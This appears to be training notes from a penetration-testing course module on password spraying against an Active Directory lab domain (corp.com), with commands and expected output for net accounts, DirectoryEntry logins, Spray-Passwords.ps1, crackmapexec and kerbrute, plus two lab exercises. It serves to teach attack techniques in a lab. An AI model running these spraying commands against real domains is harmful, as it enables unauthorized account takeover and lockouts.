# Password Attacks

Results of the net accounts command
>``` shell
>PS C:\Users\jeff> net accounts
>
># ========== Expected Result ==========
>Force user logoff how long after time expires?:       Never
>Minimum password age (days):                          1
>Maximum password age (days):                          42
>Minimum password length:                              7
>Length of password history maintained:                24
>Lockout threshold:                                    5
>Lockout duration (minutes):                           30
>Lockout observation window (minutes):                 30
>Computer role:                                        WORKSTATION
>The command completed successfully.
># =====================================
>```

Authenticating using DirectoryEntry
>``` shell
>PS C:\Users\jeff> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
>  
>PS C:\Users\jeff> $PDC = ($domainObj.PdcRoleOwner).Name
>
>PS C:\Users\jeff> $SearchString = "LDAP://"
>
>PS C:\Users\jeff> $SearchString += $PDC + "/"
>
>PS C:\Users\jeff> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
>
>PS C:\Users\jeff> $SearchString += $DistinguishedName
>
>PS C:\Users\jeff> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
>```

Successfully authenticated with DirectoryEntry
>``` shell
>distinguishedName : {DC=corp,DC=com}
>Path              : LDAP://DC1.corp.com/DC=corp,DC=com
>```

Incorrect password used with DirectoryEntry
>``` shell
>format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
>password is incorrect.
>"
>    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
>    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
>```

Using Spray-Passwords to attack user accounts
>``` shell
>PS C:\Users\jeff> cd C:\Tools
>
>PS C:\Tools> powershell -ep bypass
>
># ========== Expected Result ==========
>...
># =====================================
>
>PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
>
># ========== Expected Result ==========
>WARNING: also targeting admin accounts.
>Performing brute force - press [q] to stop the process and print results...
>Guessed password for user: 'pete' = 'Nexus123!'
>Guessed password for user: 'jen' = 'Nexus123!'
>Users guessed are:
> 'pete' with password: 'Nexus123!'
> 'jen' with password: 'Nexus123!'
># =====================================
>```

Using crackmapexec to attack user accounts
>``` shell
>kali@kali:~$ cat users.txt
>
># ========== Expected Result ==========
>dave
>jen
>pete
># =====================================
>
>kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
>
># ========== Expected Result ==========
>SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
>SMB         192.168.50.75   445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
>SMB         192.168.50.75   445    CLIENT75         [+] corp.com\jen:Nexus123!
>SMB         192.168.50.75   445    CLIENT75         [+] corp.com\pete:Nexus123!
># =====================================
>```

Crackmapexec output indicating that the valid credentials have administrative privileges on the target
>``` shell
>kali@kali:~$ crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
>
># ========== Expected Result ==========
>SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
>SMB         192.168.50.75   445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
># =====================================
>```

Using kerbrute to attack user accounts
>``` shell
>PS C:\Tools> type .\usernames.txt
>
># ========== Expected Result ==========
>pete
>dave
>jen
># =====================================
>
>PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
>
># ========== Expected Result ==========
>    __             __               __
>   / /_____  _____/ /_  _______  __/ /____
>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
> / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
>
>Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop
>
>2022/09/06 20:30:48 >  Using KDC(s):
>2022/09/06 20:30:48 >   dc1.corp.com:88
>2022/09/06 20:30:48 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
>2022/09/06 20:30:48 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
>2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
># =====================================
>```

Lab 1 - Follow the steps outlined in this section and spray the password Nexus123! with the three different tools introduced in this section. What is the minimum password length required in the target domain?
>``` shell
>
>```
>

Lab 2 - Spray the credentials of pete against all domain joined machines with crackmapexec. On which machine is pete a local administrator? The answer is just the machine name (e.g. CLIENT74).
>``` shell
>
>```
>
